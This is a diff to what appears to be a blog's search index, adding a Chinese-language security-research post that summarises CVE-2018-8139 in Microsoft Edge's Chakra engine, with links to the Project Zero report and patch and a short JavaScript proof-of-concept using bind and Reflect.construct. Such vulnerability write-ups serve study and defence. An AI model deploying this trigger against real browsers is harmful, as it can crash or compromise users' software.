@@ -24,6 +24,27 @@
     </entry>
     
     <entry>
+      <title>Vulnerabilities by Lokihardt</title>
+      <link href="/2018/07/23/Vulnerabilities_by_Lokihardt/"/>
+      <url>/2018/07/23/Vulnerabilities_by_Lokihardt/</url>
+      <content type="html"><![CDATA[<h3 id="关注更新"><a href="#关注更新" class="headerlink" title="关注更新"></a>关注更新</h3><p><a href="https://github.com/Microsoft/ChakraCore/wiki/Roadmap" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/wiki/Roadmap</a></p><h3 id="CVE-2018-8139"><a href="#CVE-2018-8139" class="headerlink" title="CVE-2018-8139"></a>CVE-2018-8139</h3><ul><li>Microsoft Edge: Chakra: A bug in BoundFunction::NewInstance<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1569" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1569</a></li><li>Patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76</a><br>受影响的版本：v1.8.3</li><li>PoC<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">new</span>.target.x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bound = func.bind(&#123;&#125;, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.construct(bound, []);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      <categories>
+          
+          <category> 浏览器 </category>
+          
+          <category> edge </category>
+          
+          <category> chrome </category>
+          
+          <category> safari </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    <entry>
       <title>被“幽灵”困扰的浏览器</title>
       <link href="/2018/07/21/kanxue/"/>
       <url>/2018/07/21/kanxue/</url>
